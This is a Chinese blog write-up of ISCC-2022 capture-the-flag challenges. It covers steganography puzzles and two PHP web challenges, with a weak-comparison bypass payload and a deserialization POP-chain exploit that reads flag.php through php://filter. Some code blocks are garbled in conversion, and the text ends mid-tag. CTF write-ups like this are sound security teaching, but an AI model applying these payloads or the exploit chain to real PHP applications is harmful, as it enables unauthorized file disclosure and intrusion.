{"blogid": "125148662", "writerAge": "码龄2年", "writerBlogNum": "29", "writerCollect": "47", "writerComment": "20", "writerFan": "37", "writerGrade": "3级", "writerIntegral": "458", "writerName": "Ki10Moc", "writerProfileAdress": "writer_image\\profile_125148662.jpg", "writerRankTotal": "41501", "writerRankWeekly": "128073", "writerThumb": "61", "writerVisitNum": "14799", "blog_read_count": "1453", "blog_time": "已于 2022-08-28 23:33:05 修改", "blog_title": "ISCC-2022", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-tomorrow-night\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"ISCC2022_0\"></a>ISCC-2022</h1>\n<h2><a id=\"httpsforumbutiannetshare1658_4\"></a>本文首发于<a href=\"https://forum.butian.net/share/1658\">奇安信攻防社区</a></h2>\n<p>注：本文所做题目时间和复现时间不一致，按照主办方每天中午更新flag，或许有不同</p>\n<h1><a id=\"_9\"></a>练武</h1>\n<h2><a id=\"MISC_11\"></a><strong>MISC</strong></h2>\n<p><strong>单板小将苏翊鸣</strong></p>\n<p>下载附件得到压缩包和图片</p>\n<p>修改高度</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-J1P7KSZ4-1654502690016)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b417a3c8-1954-485d-a9cb-dee63fe7bf34/Untitled.png)]\" src=\"image\\6562141e2f9541da8417c24b7382cfaa.png\"/></p>\n<p>扫码得到</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Ld5sERdu-1654502690018)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e06e31f1-0e80-4824-9d9f-c3c8dd407e8e/5NOU8IXE6911H(7(J.png)]\" src=\"image\\49eb5796ac0d477188cc47f6b90ac983.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-HywRxpCm-1654502690019)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9bce7339-1ee2-4efd-bf82-efa9bb5577d6/YHH31W2LYCEF0(5I07TRW.png)]\" src=\"image\\e1ab81bd21fd4395a17ebdc652cffc57.png\"/></p>\n<p>所以密码为15942</p>\n<p>得到</p>\n<p>ISCC{beij-dbxj-2004}</p>\n<h3><a id=\"_36\"></a><strong>降维打击</strong></h3>\n<p>foremost分离</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-9w2rV8a1-1654502690020)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bfdeaecd-20fc-418e-bad4-c96a0b86dcb8/Untitled.png)]\" src=\"image\\8f207d59a6e442dd8387456d79126d83.png\"/></p>\n<p>zsteg对00000567进行分析，发现在b1,r,lsb,yx通道存在一张png</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-L5uVpoNo-1654502690021)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fe530f7b-cbe5-4afa-ad0c-2cd0a7fff747/Untitled.png)]\" src=\"image\\ee63de75e14a4841994a239655be8955.png\"/></p>\n<p>分离得到</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-KbRVAwxx-1654502690021)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ec4204c6-2f0b-4b87-8237-ac193a852823/Untitled.png)]\" src=\"image\\bc303d02602547ac806222c76e4a3390.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-NrY1EZHs-1654502690022)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f3631465-89d1-4de7-82cd-ecc12a1bec31/Untitled.png)]\" src=\"image\\0330c365564744acb2dc38d00cc803d8.png\"/></p>\n<p>魔女文字对照得到flag</p>\n<p>ISCC{RARC-ZQTX-EDKM}</p>\n<h3><a id=\"1_60\"></a><strong>藏在星空中的诗-1</strong></h3>\n<p>psd图片用ps打开，不透明度设为100%</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-otmye30F-1654502690023)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6bb8a9ac-4dd5-4295-88da-c36160f4c907/Untitled.png)]\" src=\"image\\aedba6c61cb5479e8d39629a38d0e013.png\"/></p>\n<p>由图片可得顺序</p>\n<p>1 3 5 2 4</p>\n<p>然后</p>\n<p>密码就是这些星星(个人没学过MISC，真心感觉有点脑残，仅个人观点（狗头）</p>\n<p>RNM有的星星Ctrl+F都找不到</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-PH0KlvBl-1654502690024)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6056ad57-42d0-4602-8ae1-ee07db2a190d/Untitled.png)]\" src=\"image\\1d7abea02e6d4bf197b75cd5f6d2a004.png\"/></p>\n<p>ISCC{CLUOLCDYZAWTFV}</p>\n<h3><a id=\"_82\"></a>真相只有一个</h3>\n<p>将png进行处理</p>\n<pre><code class=\"prism language-php\">zsteg <span class=\"token operator\">-</span>a entity<span class=\"token operator\">.</span>png\n</code></pre>\n<p>在b1,rgb,lsb,xy通道得到一个文本</p>\n<p>提取一下</p>\n<pre><code class=\"prism language-php\">zsteg <span class=\"token operator\">-</span><span class=\"token constant\">E</span> b1<span class=\"token punctuation\">,</span>rgb<span class=\"token punctuation\">,</span>lsb<span class=\"token punctuation\">,</span>xy entity<span class=\"token operator\">.</span>png <span class=\"token operator\">&gt;</span> out2<span class=\"token operator\">.</span>png\n</code></pre>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-MQK3Zi3N-1654502690025)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6cfc520b-0e97-44fa-bbd4-b2d255f5125b/Untitled.png)]\" src=\"image\\271190f3b7ae4f2fa6a3ff26d114fb7a.png\"/></p>\n<p>对压缩包进行掩码爆破</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-bvhStqSZ-1654502690026)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d5800232-aa2c-494f-aca6-173e99f2a857/Untitled.png)]\" src=\"image\\c4e70c93e5c24abeab288d819e399ae4.png\"/></p>\n<p>解压后流量分析(stream+.zip里面的pcapng</p>\n<p>发现password.mp3</p>\n<p>并分离出来</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-kkBr3ULn-1654502690027)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/257da299-b747-4f80-9141-366d62a7e2ad/Untitled.png)]\" src=\"image\\2b99a1f949084df2b80867f1f7a8aa25.png\"/></p>\n<p>得到</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-L9TAUOAi-1654502690027)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c51fd11e-e6fa-440a-aebb-aaa0c1e0fa05/Untitled.png)]\" src=\"image\\02eb4621fb474f1ea2890ef616f77f99.png\"/></p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">.</span><span class=\"token operator\">.</span> <span class=\"token operator\">...</span> <span class=\"token operator\">-</span><span class=\"token operator\">.</span><span class=\"token operator\">-</span><span class=\"token operator\">.</span> <span class=\"token operator\">-</span><span class=\"token operator\">.</span><span class=\"token operator\">-</span><span class=\"token operator\">.</span> <span class=\"token operator\">--</span> <span class=\"token operator\">.</span><span class=\"token operator\">.</span> <span class=\"token operator\">...</span> <span class=\"token operator\">-</span><span class=\"token operator\">.</span><span class=\"token operator\">-</span><span class=\"token operator\">.</span>\n</code></pre>\n<p>得到</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3EdRlVJ7-1654502690028)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8fd202e5-19de-443b-9dd0-07899076ad80/Untitled.png)]\" src=\"image\\0d174858b57e462fba18b4e71bad8f93.png\"/></p>\n<p>猜测是nsow隐写</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\d5fdba692a36492b81bffcabbd6658f4.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-iT3YOY45-1654502690029)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/12cfd5a8-1864-4ffc-87f5-262d3b942ef9/Untitled.png)]\" src=\"image\\799f96df100d460187bb7e53b30c1bca.png\"/></p>\n<p>ISCC{4Pbq-e9h2-r8AM}</p>\n<h3><a id=\"_139\"></a>隐秘的信息</h3>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-sXkTpvIa-1654502690030)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1b053009-e903-4ccc-b769-5d8eefb10bf0/Untitled.png)]\" src=\"image\\4660c41afe0b46068c44ec11feb84f84.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-kdI4BW60-1654502690031)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4da1c62e-902f-49b8-b3b3-ead4d9a834bf/Untitled.png)]\" src=\"image\\b02322547e474070bbb7d30274155ed0.png\"/></p>\n<p>十六进制转二进制</p>\n<p>把空格消除</p>\n<pre><code class=\"prism language-php\"><span class=\"token comment\">#s tr1 = len('01100110011001000011001000110101001101000110010000110000011001000011000001100100011001010110010001100001001101010011000000111001011001000011010100111001001100000110010001100100001101010011000001100100011001000011010000111001001101100011000100110000011001000011001100110101001100100011100101100101001101010011100100110101001101010011000001100101001100010110010000111001011001000011000100110100001110010110001100110101011001100011011101100110011000110011000000110001011001100011100000110000001100000011011101100110')</span>\nstr1 <span class=\"token operator\">=</span> <span class=\"token string single-quoted-stringspan><span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> str1\n</code></pre>\n<pre><code class=\"prism language-php\"><span class=\"token numberspan>\n</code></pre>\n<p>ASCII码的二进制表达，是从 0000 0000 开始，到 0111 1111 结束</p>\n<p>得到</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-gljtoqoy-1654502690032)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da860959-f526-45be-b616-fd5d0a7af90f/Untitled.png)]\" src=\"image\\2b041234ef4f4a1dbd701fc7bab0187c.png\"/></p>\n<p>ISCC{iBud7T7RXCMJyeT8vtRq}</p>\n<h1><a id=\"WEB_172\"></a><strong>WEB</strong></h1>\n<h3><a id=\"_174\"></a><strong>冬奥会</strong></h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$Step1</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$Step2</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$info</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">array</span><span class=\"token punctuation\">)</span><span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Information'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">NULL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2022</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token variable\">$Step1</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">True</span><span class=\"token punctuation\">:</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">OR</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token number\">3</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$status</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_search</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"skiing\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$status</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">false</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">NULL</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$val</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"skiing\"</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">NULL</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$Step2</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Step1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$Step2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"2022flag.php\"</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>当Step1和Step2都为True就输出flag</p>\n<p>1、弱比较</p>\n<p>2、数组长度为3，且第二个为数组，弱比较，遍历整个数组，其中skiing是强等于，所以只要数组中除了第二个有0即可</p>\n<p>payload：</p>\n<pre><code class=\"prism language-php\">Information<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"2022a\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span>\n\nInformation<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"2022a\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\a9dfac41204e4ff1a201d98ae552025f.png\"/></p>\n<p>ISCC{W31com3_T0_Beijin9}</p>\n<h3><a id=\"Pop2022_230\"></a><strong>Pop2022</strong></h3>\n<p>源码：</p>\n<pre><code class=\"prism language-php\">Happy <span class=\"token keyword\">New</span> <span class=\"token class-name\">Year</span><span class=\"token operator\">~</span> <span class=\"token constant\">MAKE</span> <span class=\"token constant\">A</span> <span class=\"token constant\">WISH</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Happy New Year~ MAKE A WISH&lt;br&gt;'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wish'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wish'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/***************************pop your 2022*****************************/</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Road_is_Long</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/file|ftp|http|https|gopher|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You can Not Enter 2022\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Try_Work_Hard</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Make_a_Change</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$effort</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">effort</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">effort</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/**********************Try to See flag.php*****************************/</span>\n</code></pre>\n<p>非常简单的构造，就不叙述过程了</p>\n<p>exp：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Road_is_Long</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'ki10Moc'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Try_Work_Hard</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Make_a_Change</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$effort</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-&gt;</span><span class=\"token keyword type-declaration\">string</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Make_a_Change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-&gt;</span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">effort</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Try_Work_Hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img 